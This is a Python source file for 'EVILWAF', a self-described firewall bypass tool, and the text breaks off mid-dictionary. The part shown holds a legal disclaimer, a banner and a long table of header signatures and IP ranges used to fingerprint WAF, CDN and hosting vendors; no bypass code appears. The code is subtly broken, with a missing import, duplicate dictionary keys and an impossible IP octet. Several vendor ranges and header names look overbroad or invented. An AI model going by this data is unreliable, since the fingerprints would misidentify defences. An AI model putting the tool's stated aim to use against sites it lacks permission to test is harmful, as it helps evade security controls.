#!/usr/bin/env python3
"""
EVILWAF - Firewall Bypass Tool

STRICT LEGAL DISCLAIMER:
    This program is designed for educational purposes only, especially for legal security testing.
    Users must have explicit permission before testing any system. Unauthorized access is illegal.
    The developer is not responsible for any misuse or violations caused by this tool.

INTENDED USES:
    • Ethical hacking and penetration testing
    • Authorized security research
    • Educational cybersecurity training
    • Legitimate bug bounty programs

CREATED BY: Matrix Leons
CONTACT: codeleons724@gmail.com
Copyright (c) 2025 Matrix Leons. All rights reserved.

         Happy ethical hacking!

"""

import argparse
import asyncio
import aiohttp
import dns.resolver
import socket
import ssl
import re
import json
import random
import sys
import time
import requests
import base64
import jwt
from core.updater import updater



class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    PURPLE = '\033[45m'
    BLACK = '\033[40m'
    BOLD = '\033[1m'
    END = '\033[0m'



def clr():
    if os.name == "nt":
        os.system("clr")
    else:
        os.system("clear")



def fill_line_with_color(color_code, text=""):
    import os
    columns = os.get_terminal_size().columns
    spaces = " " * columns
    colored_spaces = f"{color_code}{spaces}{Colors.END}"
    
    if text:
        
        padding = (columns - len(text)) // 2
        centered_text = " " * padding + text + " " * (columns - len(text) - padding)
        return f"{color_code}{centered_text}{Colors.END}"
    else:
        return colored_spaces


print(fill_line_with_color(Colors.PURPLE, "hello world         2.2             matrix"))








def show_banner():
    banner = f"""
{Colors.BLUE}
___________     .__.__                  _____ 
\\_   _____/__  _|__|  |__  _  _______ _/ ____\\
 |    __)_\\  \\/ /  |  |\\ \\/ \\/ /\\__  \\\\   __\\ 
 |        \\\\   /|  |  |_\\     /  / __ \\|  |   
/_______  / \\_/ |__|____/\\/\\_/  (____  /__|   
        \\/                           \\/       
{Colors.END}
{Colors.WHITE}
            EVILWAF - Firewall bypass tool
        
        
  
  Created by: Matrix.                                 {Colors.CYAN}~EVILWAF{Colors.WHITE} : {Colors.BLUE}V2.2{Colors.WHITE}

                          Codename : {Colors.YELLOW}hello world{Colors.WHITE}                 
    \033[41mThe Web Application Firewall Fingerprinting Toolkit\033[0m


{Colors.END}
"""
    print(banner)

#firewall patterns will be updated to make firewall detection better...... 
#



class FirewallDetector:
    def __init__(self):
        self.firewall_patterns = {
            'cloudflare': {
                'headers': ['cf-ray', 'cf-cache-status', 'cloudflare'],
                'ips': ['104.16.0.0/12', '172.64.0.0/13', '173.245.48.0/20']
            },
            'cloudflare': {
            'headers': ['cf-ray', 'cf-cache-status', 'cloudflare', 'cf-connecting-ip', 'cf-ipcountry', 'cf-request-id', '__cfduid'],
            'ips': ['104.16.0.0/12', '172.64.0.0/13', '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22', '103.31.4.0/22', '141.101.64.0/18', '108.162.192.0/18', '190.93.240.0/20', '188.114.96.0/20', '197.234.240.0/22', '198.41.128.0/17', '162.158.0.0/15', '104.16.0.0/13', '172.64.0.0/13', '131.0.72.0/22']
            },  
            'akamai': {
            'headers': ['x-akamai-transformed', 'akamai', 'akamaiedge', 'akamai-ghost', 'x-akamai-request-id', 'akamai-origin-hop'],
            'ips': ['23.0.0.0/12', '23.192.0.0/11', '2.16.0.0/13', '184.24.0.0/13', '184.50.0.0/15', '184.84.0.0/14', '23.32.0.0/11', '72.246.0.0/15', '88.221.0.0/16', '96.6.0.0/15', '104.64.0.0/10', '184.26.0.0/15', '184.86.0.0/16', '23.74.0.0/15', '95.100.0.0/15']
            },
            'aws_waf': {
            'headers': ['x-amz-cf-pop', 'x-amz-cf-id', 'x-amzn-requestid', 'x-amz-request-id', 'awselb', 'x-amzn-trace-id'],
            'ips': ['3.0.0.0/9', '13.0.0.0/8', '52.0.0.0/8', '54.0.0.0/8', '15.0.0.0/8', '18.0.0.0/8', '35.0.0.0/8', '44.0.0.0/8', '52.95.0.0/16', '54.240.0.0/16', '99.77.0.0/16', '99.78.0.0/16', '150.222.0.0/16', '205.251.192.0/19'] 
            },
            'azure_waf': {
            'headers': ['x-azure-ref', 'x-azure-origin', 'x-azure-fdid', 'x-ms-request-id', 'x-powered-by-plesk'],
            'ips': ['20.0.0.0/8', '40.0.0.0/8', '52.0.0.0/8', '104.40.0.0/12', '13.64.0.0/11', '13.96.0.0/13', '40.112.0.0/13', '40.120.0.0/14', '52.160.0.0/11', '65.52.0.0/14', '70.37.0.0/17', '104.40.0.0/13', '104.146.0.0/16', '137.116.0.0/15', '168.61.0.0/16']
            },
            'google_cloud_armor': {
            'headers': ['x-google-cloud-armor', 'x-goog-request-reason', 'gws', 'x-cloud-trace-context', 'x-goog-request-log-name', 'gcp-loadbalancer'],
            'ips': ['8.0.0.0/8', '34.0.0.0/8', '35.0.0.0/8', '104.0.0.0/8', '107.178.0.0/15', '108.170.0.0/15', '108.177.0.0/15', '130.211.0.0/16', '142.250.0.0/15', '146.148.0.0/16', '162.216.0.0/15', '162.222.0.0/15', '172.217.0.0/15', '172.253.0.0/15', '173.194.0.0/15', '192.158.0.0/15', '199.192.0.0/14', '199.223.0.0/15', '209.85.0.0/15']
            },
            'fastly': {
            'headers': ['fastly', 'x-served-by', 'x-cache', 'x-timer', 'fastly-debug-digest', 'x-fastly-request-id'],
            'ips': ['23.235.32.0/20', '43.249.72.0/22', '103.244.50.0/24', '104.156.80.0/20', '146.75.0.0/16', '151.101.0.0/16', '157.52.0.0/16', '167.82.0.0/17', '172.111.64.0/18', '185.31.16.0/22', '199.27.72.0/21', '199.232.0.0/16']
            },
            'imperva': {
            'headers': ['imperva', 'x-iinfo', 'incap_ses', 'visid_incap', 'x-imperva-client', 'x-imperva-backend'],
            'ips': ['199.83.128.0/21', '198.143.32.0/19', '45.60.0.0/16', '45.223.0.0/16', '185.11.124.0/22', '192.230.64.0/18', '107.154.0.0/16', '45.35.0.0/16', '45.64.0.0/16', '185.234.0.0/16']
            },
            'sucuri': {
            'headers': ['sucuri', 'x-sucuri-id', 'x-sucuri-cache', 'cloudproxy', 'x-sucuri-block'],
            'ips': ['192.124.249.0/24', '192.161.0.0/24', '192.169.0.0/24', '198.58.0.0/16', '198.100.0.0/16', '199.167.0.0/16', '205.164.0.0/16']
            },
            'cloudfront': {
            'headers': ['cloudfront', 'x-amz-cf-id', 'via', 'x-amz-cf-pop'],
            'ips': ['13.32.0.0/15', '13.54.0.0/15', '13.224.0.0/14', '34.216.0.0/14', '35.182.0.0/15', '52.46.0.0/18', '52.84.0.0/15', '52.124.0.0/16', '52.222.0.0/17', '54.182.0.0/16', '54.192.0.0/16', '54.230.0.0/16', '54.239.128.0/18', '58.254.138.0/25', '64.252.64.0/18', '70.132.0.0/18', '71.152.0.0/17', '99.84.0.0/16', '103.4.8.0/22', '120.52.22.96/27', '130.176.0.0/17', '143.204.0.0/16', '144.220.0.0/16', '205.251.192.0/19', '205.251.249.0/24']
            },
            'f5_big_ip': {
            'headers': ['big-ip', 'f5', 'x-waf-event-info', 'bigipserver', 'x-forwarded-for', 'x-forwarded-proto'],
            'ips': ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16']  # Typically internal IPs
        # 
        
            },
            'barracuda': {
            'headers': ['barracuda', 'barra', 'x-barracuda', 'x-barracuda-appliance'],
            'ips': []  # Custom deployments
            },
            'fortinet': {
            'headers': ['fortinet', 'fortigate', 'x-fortigate-hostname', 'x-fortigate-client'],
            'ips': []  # Custom deployments
            },
            'citrix_netscaler': {
            'headers': ['citrix', 'x-citrix', 'ns_af', 'x-citrix-appliance'],
            'ips': []  # Custom deployments
            },
            'palo_alto': {
            'headers': ['palo alto', 'x-pan', 'x-palo-alto-firewall'],
            'ips': []  # Custom deployments 
            },
            'keycdn': {
            'headers': ['keycdn', 'x-edge-result', 'x-edge-cache', 'x-keycdn-origin'],
            'ips': ['103.214.112.0/22', '103.253.60.0/22', '104.238.128.0/22', '107.191.48.0/22', '109.239.140.0/24', '136.243.128.0/22', '144.76.0.0/19', '148.251.128.0/20', '164.138.128.0/20', '176.9.128.0/20', '185.182.112.0/22', '188.138.0.0/19', '195.201.0.0/19']
        # 
        
            },
              'stackpath': {
            'headers': ['stackpath', 'maxcdn', 'x-sp-url', 'netdna-ssl', 'x-sp-client'],
            'ips': ['151.139.0.0/16', '198.252.108.0/22', '104.156.80.0/20', '107.191.48.0/22', '146.88.128.0/20', '172.111.64.0/18', '185.31.16.0/22', '199.60.0.0/20']
            },
            'bunnycdn': {
            'headers': ['bunnycdn', 'x-bunny-log-id', 'x-pullzone-id', 'x-bunny-server'],
            'ips': ['159.100.351.0/24', '45.134.144.0/24', '89.187.160.0/24', '103.233.192.0/24', '185.234.0.0/24', '194.87.0.0/24']
            },
            'cdn77': {
            'headers': ['cdn77', 'x-77-pop', 'x-cdn77-origin'],
            'ips': ['185.151.28.0/22', '185.224.0.0/22', '193.188.0.0/22', '194.110.0.0/22', '195.181.0.0/22']
            },
            'godaddy': {
            'headers': ['godaddy', 'x-godaddy', 'x-godaddy-proxy'],
            'ips': ['31.222.116.0/24', '50.63.202.0/24', '97.74.0.0/16', '173.201.0.0/16', '184.168.0.0/16', '198.71.0.0/16', '208.109.0.0/16']
        # 
        
            },
            'siteground': {
            'headers': ['siteground', 'x-siteground', 'x-siteground-proxy'],
            'ips': ['35.214.0.0/16', '35.241.0.0/16', '107.180.0.0/16', '162.159.0.0/16', '172.105.0.0/16'] 
            },
            'wpengine': {
            'headers': ['wpengine', 'x-wpengine', 'x-wpe-backend'],
            'ips': ['35.196.0.0/16', '104.196.0.0/16', '162.222.0.0/16', '192.0.96.0/20']
            },
            'alibaba_cloud': {
            'headers': ['alibaba', 'ali-cdn', 'eagleid', 'x-readtime', 'x-alibaba-cloud'],
            'ips': ['47.0.0.0/8', '106.11.0.0/16', '118.31.0.0/16', '120.27.0.0/16', '121.43.0.0/16', '139.196.0.0/16', '182.92.0.0/16']
        # 
        
            },
            'tencent_cloud': {
            'headers': ['tencent', 'x-oss-request-id', 'x-tencent-cloud'],
            'ips': ['119.28.0.0/16', '129.211.0.0/16', '139.199.0.0/16', '150.109.0.0/16', '162.14.0.0/16']
            },
            'huawei_cloud': {
            'headers': ['huawei', 'huaweicloud', 'x-hw-id', 'x-huawei-cloud'],
            'ips': ['117.78.0.0/18', '121.36.0.0/14', '139.9.0.0/16', '159.138.0.0/16', '182.92.0.0/16']
            },
            'nginx': {
            'headers': ['nginx', 'x-nginx', 'x-accel', 'server: nginx'],
            'ips': []  # Custom deployments
        # 
        
            },
            'haproxy': {
            'headers': ['haproxy', 'x-haproxy', 'x-haproxy-server'],
            'ips': []  # Custom deployments
            },
            'varnish': {
            'headers': ['varnish', 'x-varnish', 'x-cache', 'server: varnish'],
            'ips': []  # Custom deployments
            },
            'wordfence': {
            'headers': ['wordfence', 'x-wordfence-blocked', 'x-wordfence-firewall'],
            'ips': []  # Plugin-based, no specific IP ranges
        # 
        
            },
            'sucuri_waf': {
            'headers': ['sucuri', 'x-sucuri-filter', 'x-sucuri-block'],
            'ips': ['192.88.134.0/23', '185.93.228.0/22', '192.169.0.0/16']
            },
            'kong': {
            'headers': ['kong', 'x-kong-upstream-latency', 'x-kong-proxy'],
            'ips': []  # Custom deployments
        # 
        
            },
            'modsecurity': {
            'headers': ['mod_security', 'modsecurity', 'web application firewall'],
            'ips': []  # Software-based
        # 
        
            },
            'datadome': {
            'headers': ['datadome', 'x-datadome', 'dd_', 'x-datadome-client'],
            'ips': ['35.180.0.0/16', '52.47.0.0/16', '54.93.0.0/16', '13.32.0.0/15', '13.224.0.0/14']
        # 
        
            },
            'perimeterx': {
            'headers': ['perimeterx', '_px', 'x-px', 'x-px-authorization'],
            'ips': ['52.28.0.0/16', '52.57.0.0/16', '52.208.0.0/16', '54.93.0.0/16'] 
            },
            'cloudflare_waf': {
            'headers': ['cf-waf', 'cf-firewall', 'x-cf-firewall'],
            'ips': ['104.16.0.0/12', '172.64.0.0/13', '173.245.48.0/20']  # Same as Cloudflare
            },
            'aws_shield': {
            'headers': ['aws-shield', 'x-aws-shield'],
            'ips': ['3.0.0.0/9', '13.0.0.0/8', '52.0.0.0/8']  # Same as AWS WAF
            },
            'oracle_cloud': {
            'headers': ['x-oracle', 'oracle.com', 'x-oci-compartment-id', 'x-oci-request-id'],
            'ips': ['129.213.0.0/16', '132.145.0.0/16', '134.70.0.0/16', '138.1.0.0/16', '140.91.0.0/16', '147.154.0.0/16', '150.136.0.0/16', '152.67.0.0/16', '158.101.0.0/16', '160.1.0.0/16', '192.29.0.0/16']
            },
            'baidu_cloud': {
            'headers': ['baidu', 'x-bce-request-id', 'x-baidu-logid', 'x-bce-content-sha256'],
            'ips': ['220.181.0.0/16', '123.125.0.0/16', '61.135.0.0/16', '180.76.0.0/16', '39.156.0.0/16', '103.235.44.0/22', '119.3.0.0/16']
            },
            'digitalocean': {
            'headers': ['digitalocean', 'do-app-origin', 'x-do-app-origin', 'x-digitalocean-ip'],
            'ips': ['104.131.0.0/16', '104.236.0.0/16', '138.197.0.0/16', '138.68.0.0/16', '139.59.0.0/16', '142.93.0.0/16', '143.198.0.0/16', '147.182.0.0/16', '157.230.0.0/16', '159.65.0.0/16', '159.89.0.0/16', '161.35.0.0/16', '164.90.0.0/16', '165.227.0.0/16', '167.71.0.0/16', '167.99.0.0/16', '174.138.0.0/16', '178.62.0.0/16', '188.166.0.0/16', '188.226.0.0/16', '192.241.0.0/16', '198.199.0.0/16', '198.211.0.0/16', '206.189.0.0/16', '207.154.0.0/16', '209.97.0.0/16', '68.183.0.0/16', '82.196.0.0/16', '95.85.0.0/16']
        # 
        
            },
            'linode': {
            'headers': ['linode', 'x-linode-id', 'x-linode-request-id', 'x-akamai-edgescape'],
            'ips': ['45.33.0.0/16', '45.56.0.0/16', '45.79.0.0/16', '50.116.0.0/16', '66.175.208.0/20', '66.228.32.0/19', '69.46.64.0/18', '69.164.192.0/19', '74.207.224.0/19', '75.127.0.0/17', '96.126.96.0/19', '97.107.128.0/18', '103.3.60.0/22', '106.187.32.0/19', '139.162.0.0/16', '172.104.0.0/15', '172.233.0.0/16', '173.230.128.0/17', '173.255.128.0/17', '176.58.0.0/15', '178.79.128.0/17', '185.3.92.0/22', '192.46.208.0/20', '192.81.128.0/17', '192.155.80.0/20', '198.58.96.0/19', '212.71.232.0/21', '213.219.32.0/19', '23.239.0.0/16', '23.92.16.0/20']
            },
            'vultr': {
            'headers': ['vultr', 'x-vultr-id', 'x-vultr-pop', 'server: vultr'],
            'ips': ['45.76.0.0/16', '45.32.0.0/16', '63.209.32.0/19', '104.156.224.0/19', '108.61.0.0/16', '140.82.0.0/16', '144.202.0.0/16', '149.28.0.0/16', '155.138.128.0/17', '199.247.0.0/16', '207.246.64.0/18', '95.179.128.0/17', '217.163.16.0/20']
            },
            'hetzner': {
            'headers': ['hetzner', 'x-hetzner', 'x-hetzner-request-id', 'hetzner-cloud'],
            'ips': ['5.9.0.0/16', '78.46.0.0/15', '88.198.0.0/16', '94.130.0.0/15', '116.203.0.0/16', '135.181.0.0/16', '136.243.0.0/16', '138.201.0.0/16', '144.76.0.0/16', '148.251.0.0/16', '159.69.0.0/16', '162.55.0.0/16', '167.233.0.0/16', '168.119.0.0/16', '176.9.0.0/16', '178.63.0.0/16', '195.201.0.0/16', '213.133.96.0/19', '213.239.192.0/18', '23.88.0.0/16', '49.12.0.0/16', '65.108.0.0/16', '85.10.192.0/18', '95.216.0.0/16']
            },
            'ovh': {
            'headers': ['ovh', 'x-ovh-id', 'x-ovh-request-id', 'ovh-cache'],
            'ips': ['51.38.0.0/16', '51.68.0.0/16', '51.75.0.0/16', '51.77.0.0/16', '51.79.0.0/16', '51.81.0.0/16', '51.83.0.0/16', '51.89.0.0/16', '51.91.0.0/16', '54.36.0.0/16', '54.37.0.0/16', '137.74.0.0/16', '141.94.0.0/16', '141.95.0.0/16', '142.44.128.0/17', '146.59.0.0/16', '147.135.0.0/16', '149.202.0.0/16', '151.80.0.0/16', '152.228.128.0/17', '158.69.0.0/16', '164.132.0.0/16', '167.114.0.0/16', '176.31.0.0/16', '178.32.0.0/15', '188.165.0.0/16', '192.95.0.0/16', '193.70.0.0/17', '198.27.64.0/18', '198.50.128.0/17', '213.186.0.0/16', '213.251.128.0/18', '37.187.0.0/16', '37.59.0.0/16', '5.135.0.0/16', '5.196.0.0/16', '5.39.0.0/16', '87.98.128.0/17', '91.121.0.0/16', '92.222.0.0/16', '94.23.0.0/16']
            },
            'scaleway': {
            'headers': ['scaleway', 'x-scaleway-id', 'x-scaleway-request-id', 'x-scw-request-id'],
            'ips': ['51.15.0.0/16', '51.158.0.0/15', '62.210.0.0/16', '163.172.0.0/16', '195.154.0.0/16', '212.47.224.0/19', '212.83.128.0/19']
            },
            'check_point': {
            'headers': ['check point', 'cpx-cache-status', 'x-checkpoint', 'x-fw-request-id'],
            'ips': []  # Custom deployments
        #  
        
            },
            'cisco_waf': {
            'headers': ['cisco', 'x-cisco-request-asset', 'x-cisco-waf', 'cisco-waf'],
            'ips': []  # Custom deployments
            },
            'juniper_waf': {
            'headers': ['juniper', 'x-juniper-id', 'x-juniper-waf', 'junos-waf'],
            'ips': []  # Custom deployments
            },
            'sonicwall': {
            'headers': ['sonicwall', 'x-sonicwall-id', 'x-sonicwall-waf', 'sonicwall-waf'],
            'ips': []  # Custom deployments
            },
            'watchguard': {
            'headers': ['watchguard', 'x-watchguard', 'x-wg-request-id', 'watchguard-waf'],
            'ips': []  # Custom deployments
            },
            'sophos_waf': {
            'headers': ['sophos', 'x-sophos-id', 'x-sophos-waf', 'sophos-firewall'],
            'ips': []  # Custom deployments
            },
            'radware_waf': {
            'headers': ['radware', 'x-radware-waf', 'radware-waf', 'x-radware-request-id'],
            'ips': []  # Custom deployments
        #
        
            },
            'a10_networks': {
            'headers': ['a10', 'x-a10-request-id', 'a10-waf', 'x-a10-thunder'],
            'ips': []  # Custom deployments
            },
            'array_networks': {
            'headers': ['array', 'x-array-id', 'array-waf', 'x-array-networks'],
            'ips': []  # Custom deployments
            },
            'kemp_waf': {
            'headers': ['kemp', 'x-kemp-loadmaster', 'kemp-waf', 'x-kemp-request'],
            'ips': []  # Custom deployments
            },
            'apache_waf': {
            'headers': ['apache', 'x-apache', 'server: apache', 'x-apache-waf'],
            'ips': []  # Custom deployments
        # 
        
            },
            'microsoft_iis': {
            'headers': ['microsoft-iis', 'x-aspnet-version', 'x-powered-by', 'server: microsoft-iis'],
            'ips': []  # Custom deployments
            },
            'tomcat_waf': {
            'headers': ['tomcat', 'x-tomcat-id', 'server: apache-coyote', 'x-tomcat-waf'],
            'ips': []  # Custom deployments
            },
            'jetty_waf': {
            'headers': ['jetty', 'x-jetty', 'server: jetty', 'x-jetty-waf'],
            'ips': []  # Custom deployments
            },
            'weblogic_waf': {
            'headers': ['weblogic', 'x-weblogic-request-clusterinfo', 'x-weblogic-waf', 'server: weblogic'],
            'ips': []  # Custom deployments
            },
            'websphere_waf': {
            'headers': ['websphere', 'x-websphere-id', 'x-websphere-waf', 'server: websphere'],
            'ips': []  # Custom deployments
            },
            'jboss_waf': {
            'headers': ['jboss', 'x-jboss', 'server: jboss-web', 'x-jboss-waf'],
            'ips': []  # Custom deployments
            },
            'wildfly_waf': {
            'headers': ['wildfly', 'x-wildfly', 'server: wildfly', 'x-wildfly-waf'],
            'ips': []  # Custom deployments
            },
            'glassfish_waf': {
            'headers': ['glassfish', 'x-glassfish-id', 'server: glassfish', 'x-glassfish-waf'],
            'ips': []  # Custom deployments
            },
            'resin_waf': {
            'headers': ['resin', 'x-resin-id', 'server: resin', 'x-resin-waf'],
            'ips': []  # Custom deployments
            },
            'undertow_waf': {
            'headers': ['undertow', 'x-undertow', 'server: undertow', 'x-undertow-waf'],
            'ips': []  # Custom deployments 
            },
            'signal_sciences': {
            'headers': ['signal sciences', 'sigsci-waf', 'x-sigsci-requestid', 'x-sigsci-agentresponse'],
            'ips': ['52.4.0.0/16', '52.5.0.0/16', '52.7.0.0/16', '54.85.0.0/16', '54.88.0.0/16', '107.23.0.0/17']
            
        # 
        
            },
            'fastly_signal_sciences': {
            'headers': ['fastly', 'sigsci', 'x-sigsci-tags', 'x-fastly-sigsci'],
            'ips': ['23.235.32.0/20', '43.249.72.0/22', '103.244.50.0/24']  # Same as Fastly
            },
            'threatx_waf': {
            'headers': ['threatx', 'x-threatx-id', 'x-threatx-score', 'threatx-waf'],
            'ips': ['54.208.0.0/16', '54.209.0.0/16', '107.22.0.0/16', '174.129.0.0/16']
            },
            'wallarm_waf': {
            'headers': ['wallarm', 'x-wallarm-mode', 'wallarm-status', 'x-wallarm-request-id'],
            'ips': ['34.102.136.180/32', '35.235.66.155/32', '104.199.0.0/16', '35.184.0.0/16'] 
            },
            'apptrana_waf': {
            'headers': ['apptrana', 'indusface', 'x-apptrana', 'x-indusface-waf'],
            'ips': ['52.66.0.0/16', '13.127.0.0/16', '13.234.0.0/15', '35.154.0.0/16'] 
            },
            'qualys_waf': {
            'headers': ['qualys', 'x-qualys-scan', 'qualys-waf', 'x-qualys-request'],
            'ips': ['64.39.96.0/20', '199.7.52.0/24', '216.245.194.0/24', '216.245.195.0/24']
        # 
        
            },
            'rapid7_waf': {
            'headers': ['rapid7', 'x-r7-id', 'rapid7-waf', 'x-rapid7-scan'],
            'ips': ['208.118.227.0/24', '208.118.228.0/24', '5.153.225.0/24', '71.6.233.0/24']
            },
            'veracode_waf': {
            'headers': ['veracode', 'x-veracode', 'veracode-waf', 'x-veracode-scan'],
            'ips': ['208.70.144.0/24', '96.31.172.0/24', '204.154.64.0/22']  
            },
            'whitehat_waf': {
            'headers': ['whitehat security', 'x-whitehat', 'whitehat-waf', 'x-whitehat-scan'],
            'ips': ['206.51.29.0/24', '208.118.240.0/24', '69.46.86.0/24']
            },
            'checkmarx_waf': {
            'headers': ['checkmarx', 'x-checkmarx', 'checkmarx-waf', 'x-checkmarx-scan'],
            'ips': []  # Cloud-based service with dynamic IPs 
            },
            'synopsys_waf': {
            'headers': ['synopsys', 'x-synopsys', 'synopsys-waf', 'x-synopsys-scan'],
            'ips': []  # Cloud-based service with dynamic IPs
            },
            'hcl_appscan': {
            'headers': ['appscan', 'x-hcl-appscan', 'hcl-waf', 'x-appscan-request'],
            'ips': []  # Cloud-based service with dynamic IPs
            },
            'micro_focus_waf': {
            'headers': ['micro focus', 'x-microfocus', 'microfocus-waf', 'x-fortify'],
            'ips': []  # Cloud-based service with dynamic IPs 
            },
            'sonarqube_waf': {
            'headers': ['sonar', 'x-sonar', 'sonarqube-waf', 'x-sonarqube'],
            'ips': []  # Self-hosted typically
            },
            'snyk_waf': {
            'headers': ['snyk', 'x-snyk-id', 'snyk-waf', 'x-snyk-scan'],
            'ips': []  # Cloud-based service with dynamic IPs
            },
            'naxsi_waf': {
            'headers': ['naxsi', 'x-naxsi-sig', 'naxsi-waf', 'x-naxsi-evid'],
            'ips': []  # Nginx module, custom deployments
        # 
        
            },
            'lua_resty_waf': {
            'headers': ['lua-resty-waf', 'x-lua-resty', 'lua-waf', 'x-lua-waf'],
            'ips': []  # OpenResty module, custom deployments
            },
            'openappsec_waf': {
            'headers': ['openappsec', 'x-openappsec', 'openappsec-waf', 'x-openappsec-id'],
            'ips': []  # Open source solution, custom deployments  
            },
            'shadow_daemon': {
            'headers': ['shadowd', 'x-shadow-daemon', 'shadow-daemon-waf', 'x-shadowd'],
            'ips': []  # Open source solution, custom deployments
            },
            'azure_front_door': {
            'headers': ['azurefd', 'x-azure-fdid', 'x-fd-healthprobe', 'x-azure-ref'],
            'ips': ['40.90.0.0/16', '40.126.0.0/18', '13.73.248.16/29', '20.21.37.40/29', '20.36.120.104/29', '20.37.156.216/29', '20.37.195.96/29', '20.38.85.152/29', '20.39.13.32/29', '20.41.6.0/28', '20.42.4.208/29', '20.42.129.152/29', '20.42.224.40/29', '20.43.41.136/29', '20.43.65.128/29', '20.43.130.80/29', '20.44.4.72/29', '20.44.17.80/29', '20.45.113.128/29', '20.45.192.104/29', '20.46.13.32/29', '20.150.160.0/23', '20.189.107.0/24', '40.67.48.0/21', '40.67.56.0/24', '40.67.60.0/22', '40.82.248.0/22', '40.90.23.192/26', '40.90.24.0/25', '40.90.25.0/26', '40.90.26.64/26', '40.90.27.0/25', '40.90.28.0/24', '40.90.30.0/24', '40.90.31.0/25', '40.90.128.0/17', '40.119.8.0/25', '40.119.64.0/22']
        # 
        
            },
            'google_cloud_cdn': {
            'headers': ['x-goog-meta', 'x-guploader-uploadid', 'x-goog-generation', 'x-google-cache-control'],
            'ips': ['8.0.0.0/8', '34.0.0.0/8', '35.0.0.0/8', '104.0.0.0/8', '107.178.0.0/15', '108.170.0.0/15', '108.177.0.0/15', '130.211.0.0/16', '142.250.0.0/15', '146.148.0.0/16', '162.216.0.0/15', '162.222.0.0/15', '172.217.0.0/15', '172.253.0.0/15', '173.194.0.0/15', '192.158.0.0/15', '199.192.0.0/14', '199.223.0.0/15', '209.85.0.0/15']  # Same as Google Cloud Armor 
       
            },   
            'ironbee': {
            'headers': ['ironbee', 'x-ironbee'],
            'ips': []  # Open source WAF, custom deployments
            },
            'webknight': {
            'headers': ['webknight', 'aqtronix webknight'],
            'ips': []  # ISAPI filter, no specific IP ranges
            },
            'dotdefender': {
            'headers': ['dotdefender', 'applicure'],
            'ips': []  # Software WAF, custom deployments 
            },
            'comodo': {
            'headers': ['comodo', 'x-comodo-waf'],
            'ips': ['5.188.0.0/16', '5.189.0.0/16', '5.254.0.0/16', '8.39.0.0/16', '45.86.0.0/16', '64.94.0.0/16', '91.200.0.0/16', '185.162.0.0/16', '192.145.0.0/16']
            },
            'wordfence': {
            'headers': ['wordfence', 'x-wordfence-blocked'],
            'ips': []  # Plugin-based, no specific IP ranges
        # 
        
            },
            'malcare': {
            'headers': ['malcare', 'x-malcare'],
            'ips': ['35.200.0.0/16', '35.244.0.0/16']  # Google Cloud IPs 
            },
            'ithemes_security': {
            'headers': ['ithemes', 'x-ithemes'],
            'ips': []  # Plugin-based
            },
            'ninjafirewall': {
            'headers': ['ninjafirewall', 'x-ninja-firewall'],
            'ips': []  # Plugin-based
            },
            'bulletproof_security': {
            'headers': ['bulletproof', 'x-bps'],
            'ips': []  # Plugin-based
            },
            'cloudways': {
            'headers': ['cloudways', 'x-cloudways'],
            'ips': ['35.185.0.0/16', '35.196.0.0/16', '35.237.0.0/16', '104.196.0.0/16', '146.148.0.0/16']
        #
        
            },
            'kinsta': {
            'headers': ['kinsta', 'x-kinsta-cache'],
            'ips': ['35.196.0.0/16', '104.196.0.0/16', '130.211.0.0/16', '146.148.0.0/16']    
            },
            'wp_engine': {
            'headers': ['wpengine', 'x-wpengine'],
            'ips': ['35.196.0.0/16', '104.196.0.0/16', '162.222.0.0/16', '192.0.96.0/20']
            },
            'flywheel': {
            'headers': ['flywheel', 'x-flywheel'],
            'ips': ['35.185.0.0/16', '104.198.0.0/16', '146.148.0.0/16']
            },
            'pressable': {
            'headers': ['pressable', 'x-pressable'],
            'ips': ['104.196.0.0/16', '146.148.0.0/16']  
            },
            'godaddy': {
            'headers': ['godaddy', 'x-godaddy'],
            'ips': ['31.222.116.0/24', '50.63.202.0/24', '97.74.0.0/16', '173.201.0.0/16', '184.168.0.0/16', '198.71.0.0/16', '208.109.0.0/16']
                
        
            },
            'namecheap': {
            'headers': ['namecheap', 'x-namecheap'],
            'ips': ['198.54.0.0/16', '199.101.0.0/16', '216.172.0.0/16']      
            },
            'bluehost': {
            'headers': ['bluehost', 'x-bluehost'],
            'ips': ['50.87.0.0/16', '66.147.0.0/16', '68.178.0.0/16', '74.220.0.0/16', '162.144.0.0/16', '166.62.0.0/16']
            },
            'hostgator': {
            'headers': ['hostgator', 'x-hostgator'],
            'ips': ['50.87.0.0/16', '68.178.0.0/16', '74.220.0.0/16', '162.144.0.0/16', '166.62.0.0/16']
            },
            'siteground': {
            'headers': ['siteground', 'x-siteground'],
            'ips': ['35.214.0.0/16', '35.241.0.0/16', '107.180.0.0/16', '162.159.0.0/16', '172.105.0.0/16']
            },
            'dreamhost': {
            'headers': ['dreamhost', 'x-dreamhost'],
            'ips': ['66.33.0.0/16', '75.119.0.0/16', '173.236.0.0/16', '208.113.0.0/16']
            },
            'a2_hosting': {
            'headers': ['a2hosting', 'x-a2-optimized'],
            'ips': ['72.52.0.0/16', '96.126.0.0/16', '108.171.0.0/16', '162.216.0.0/16', '198.252.0.0/16']
            },
            'inmotion': {
            'headers': ['inmotionhosting', 'x-inmotion'],
            'ips': ['65.61.0.0/16', '70.39.0.0/16', '74.124.0.0/16', '162.144.0.0/16', '173.236.0.0/16']
            },
            'liquid_web': {
            'headers': ['liquidweb', 'x-liquidweb'],
            'ips': ['69.167.0.0/16', '72.55.0.0/16', '209.40.0.0/16']
            },
            'media_temple': {
            'headers': ['mediatemple', 'x-mt-id'],
            'ips': ['64.207.0.0/16', '66.228.0.0/16', '72.47.0.0/16', '216.120.0.0/16']
            },
            'traefik': {
            'headers': ['traefik', 'x-traefik'],
            'ips': []  # Custom deployments
        
        
            },
            'envoy': {
            'headers': ['envoy', 'x-envoy', 'x-request-id'],
            'ips': []  # Custom deployments  
            },
            'sucuri': {
            'headers': ['sucuri', 'x-sucuri-id', 'cloudproxy', 'x-sucuri-cache'],
            'ips': ['192.88.134.0/23', '185.93.228.0/22', '192.169.0.0/16', '198.58.0.0/16', '198.100.0.0/16', '199.167.0.0/16']
        
        
            },
            'sitelock': {
            'headers': ['sitelock', 'x-sitelock-id'],
            'ips': ['69.58.0.0/16', '74.124.0.0/16', '198.58.0.0/16']
            },          
            'squid': {
            'headers': ['squid', 'x-squid-error', 'via'],
            'ips': []  # Custom deployments
            },
            'varnish': {
